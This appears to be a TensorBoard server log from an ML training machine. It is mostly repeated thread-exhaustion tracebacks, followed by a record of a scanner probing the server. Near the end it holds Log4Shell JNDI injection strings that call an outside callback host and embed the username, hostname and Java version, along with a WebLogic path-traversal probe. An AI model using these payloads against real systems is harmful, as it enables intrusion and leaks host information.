+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 14:58:48.791084 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 15:31:55.002548 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+W0603 15:32:59.445150 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun03_14-01-31_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+E0603 15:56:39.449737 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 15:56:39.600239 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 15:56:39.697620 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+W0603 16:07:10.217217 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun03_15-33-38_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+E0603 16:16:01.070373 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:19:04.340998 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+W0603 16:21:15.517068 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun03_16-07-21_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+E0603 16:24:39.078207 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:24:39.079213 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:24:39.079743 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:24:39.082907 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:24:39.213808 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+W0603 16:33:25.787459 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun03_16-21-45_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+E0603 16:52:26.278964 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.280694 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.281568 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.282078 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.290224 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.295336 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.387224 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.400339 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.401619 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.520451 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.524404 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.642330 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.646063 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.765002 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:52:26.767027 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:06.758616 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:06.759525 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:06.760037 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:06.761289 140431058790144 application.py:445] Plugin listing: is_active() for projector failed (marking inactive)
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/site-packages/tensorboard/backend/application.py", line 436, in _serve_plugins_listing
+    is_active = plugin.is_active()
+                ^^^^^^^^^^^^^^^^^^
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/site-packages/tensorboard/plugins/projector/projector_plugin.py", line 315, in is_active
+    new_thread.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:06.761704 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:06.765493 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:06.879122 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:06.886726 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+E0603 16:56:07.014841 140431751108416 program.py:855] HTTP serving error
+Traceback (most recent call last):
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 317, in _handle_request_noblock
+    self.process_request(request, client_address)
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/socketserver.py", line 705, in process_request
+    t.start()
+  File "/home/work/wujiarong/.envs/mm_py311_cuda114/lib/python3.11/threading.py", line 964, in start
+    _start_new_thread(self._bootstrap, ())
+RuntimeError: can't start new thread
+W0606 13:50:48.369826 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun02_14-22-10_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 13:50:53.376054 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'May30_23-54-30_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 13:50:53.376284 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'May31_12-09-51_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 13:50:53.376329 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'May30_22-53-21_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_contrastive_lerning_cnn_bert'
+W0606 13:50:53.376368 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'May31_11-32-59_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 13:50:53.376404 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun03_16-33-57_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 13:50:53.376439 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun02_16-22-23_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 13:55:58.422560 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun06_13-54-22_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 13:58:28.445732 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun06_13-51-58_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 14:45:18.941461 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun06_14-42-02_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 15:55:34.902286 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun06_13-56-19_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 15:55:34.902534 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun06_14-44-32_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0606 15:55:34.902571 140431317747456 plugin_event_multiplexer.py:267] Deleting accumulator 'Jun06_13-58-31_yq01-inf-hic-k8s-a100-aa24-0494.yq01.baidu.com_finetune'
+W0615 07:19:19.951047 140431303976704 application.py:559] path /v2/keys not found, sending 404
+E0615 07:19:20.144257 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:19:20] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:19:20.327827 140431303976704 application.py:559] path /v3/kv/range not found, sending 404
+E0615 07:19:20.441864 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:19:20] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:19:26.463914 140431303976704 application.py:559] path /druid/index.html not found, sending 404
+E0615 07:19:26.625587 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:19:26] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:19:28.564037 140431303976704 application.py:559] path /version not found, sending 404
+E0615 07:19:28.628062 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:19:28] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:19:56.256405 140431303976704 application.py:559] path /rs-status not found, sending 404
+W0615 07:19:56.345632 140431303976704 application.py:559] path /master-status not found, sending 404
+E0615 07:19:56.431485 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:19:56] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:20:42.347752 140431303976704 application.py:559] path /api/v1 not found, sending 404
+W0615 07:20:42.847226 140431303976704 application.py:559] path /v1/submissions not found, sending 404
+W0615 07:20:52.133811 140431303976704 application.py:559] path /login not found, sending 404
+E0615 07:20:52.233838 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:20:52] code 400, message Bad request version ('³hðÅì`\x8e\x92')
+W0615 07:21:26.530856 140431303976704 application.py:559] path /currentUser not found, sending 404
+E0615 07:21:26.629882 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:26] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:21:36.634411 140431303976704 application.py:559] path /v2/_catalog not found, sending 404
+E0615 07:21:36.728201 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:36] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:21:37.149753 140431303976704 application.py:559] path /index/api/getServerConfig not found, sending 404
+E0615 07:21:37.314476 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:37] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:21:37.505529 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:37] code 400, message Bad request version ('#\x8aAIÝDÖCFFpP3eáÓ¹é\x0f')
+E0615 07:21:38.915335 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:38] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:21:42.136001 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:42] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03È#ð3BX\x0eî§.dRÞ\x87\x97Üá´Ñö[h6')
+E0615 07:21:43.322406 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:43] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0615 07:21:44.129040 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:44] code 400, message Bad request version ('Ó\x81MWU\x01`\x05Ù')
+W0615 07:21:44.833550 140431303976704 application.py:559] path /admin not found, sending 404
+W0615 07:21:45.939368 140431303976704 application.py:559] path /query not found, sending 404
+E0615 07:21:46.115130 140431303976704 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:46] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:21:46.534511 140431069280000 application.py:559] path /apisix/admin/routes not found, sending 404
+W0615 07:21:47.029903 140431069280000 application.py:559] path /actuator/gateway/routes/secscan9aec not found, sending 404
+W0615 07:21:47.146007 140431069280000 application.py:559] path /actuator/gateway/refresh not found, sending 404
+W0615 07:21:47.327709 140431069280000 application.py:559] path /actuator/gateway/routes/secscan9aec not found, sending 404
+W0615 07:21:50.614916 140431069280000 application.py:559] path /${jndi:ldap://log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top/aaa} not found, sending 404
+W0615 07:21:51.337581 140431069280000 application.py:559] path /%24%7Bjndi%3Aldap%3A%2F%2Flog4j04567902a986c53f7498e687978071c5.hacked.bdsec.top%2Faaa%7D not found, sending 404
+W0615 07:21:52.035598 140431069280000 application.py:559] path /${j${k8s:k5:-ND}i:ldap://${sys:user.name}.log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top/xxx} not found, sending 404
+W0615 07:21:52.051844 140431303976704 application.py:559] path /RPC2 not found, sending 404
+W0615 07:21:52.529635 140431303976704 application.py:559] path /%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%3Aldap%3A%2F%2F%24%7Bsys%3Auser.name%7D.log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top%2Fxxx%7D not found, sending 404
+W0615 07:21:53.147956 140431303976704 application.py:559] path /${jndi:rmi://${hostName}.log4j.${java:version}.log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top/em4fmk} not found, sending 404
+E0615 07:21:53.209648 140431069280000 _internal.py:96] 10.14.198.40 - - [15/Jun/2024 07:21:53] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0615 07:21:53.249157 140431069280000 application.py:559] path /ws/v1/cluster/apps/new-application not found, sending 404
+W0615 07:21:53.947489 140431069280000 application.py:559] path /%24%7Bjndi%3Armi%3A%2F%2F%24%7BhostName%7D.log4j.%24%7Bjava%3Aversion%7D.log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top%2Fem4fmk%7D not found, sending 404
+W0615 07:21:54.542414 140431069280000 application.py:559] path /${jndi:ldap://log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top/aaa} not found, sending 404
+W0615 07:21:55.238020 140431069280000 application.py:559] path /%24%7Bjndi%3Aldap%3A%2F%2Flog4j04567902a986c53f7498e687978071c5.hacked.bdsec.top%2Faaa%7D not found, sending 404
+W0615 07:21:55.818845 140431069280000 application.py:559] path /run not found, sending 404
+W0615 07:21:55.941357 140431069280000 application.py:559] path /${j${k8s:k5:-ND}i:ldap://${sys:user.name}.log4j04567902a986c53f7498e687978071c5.hacked.bdsec.top/xxx} not found, sending 404
+W0615 07:21:56.133263 140431069280000 application.py:559] path /console/images/%2E%2E%2Fconsole.portal not found, sending 404
